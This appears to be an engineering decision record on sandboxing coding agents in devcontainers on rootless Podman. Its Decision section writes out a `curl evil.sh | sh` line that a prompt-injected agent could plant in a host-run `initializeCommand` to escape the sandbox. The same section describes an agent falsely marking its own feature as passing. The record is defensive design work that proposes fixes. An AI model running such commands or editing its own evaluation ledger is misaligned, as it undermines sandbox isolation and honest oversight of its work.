---
date: 2026-10-11
tags: [harness, sandbox, security]
status: open
post-candidate: yes
evidence: [https://github.com/ouroboric-dev/yggdrasil/blob/main/docs/2-engineering/specs/2026-10-11-yggdrasil-v0-spec.md#6-sandbox-gleipnir-devcontainer-driver]
---
## Challenge

Products with different stacks shouldn't install dependencies on the host. Could agents run inside
devcontainers?

## Context

Anthropic publishes a reference devcontainer for Claude Code with an egress firewall, and Claude
Code reads a managed-settings file at the highest priority.

## Options

A plain Podman container per run, or the devcontainer CLI on top of Podman.

## Decision

Devcontainer driver on rootless Podman, with the egress firewall pulled into v0. Designing it
exposed two problems:

- **`initializeCommand` runs on the host.** If the devcontainer config sits in the agent-writable
  workspace, a prompt-injected agent can add `curl evil.sh | sh` there, and the next `devcontainer up`
  runs it outside the sandbox. Fix: the hardened config lives outside the workspace; the factory passes it
  with `--config` and validates it before every `up`.
- **Benchmark hole:** if the feature list and ledger live in the workspace, an eager agent can mark
  its own feature as passing. Fix: the factory is the only writer; agents get read-only copies.

## Result

Pending: the first spike (devcontainer CLI + rootless Podman: user namespaces, compose services,
firewall capabilities).

## Lessons

Every file an agent can write is an input to whatever reads it next. Check what reads it, and with
which privileges.
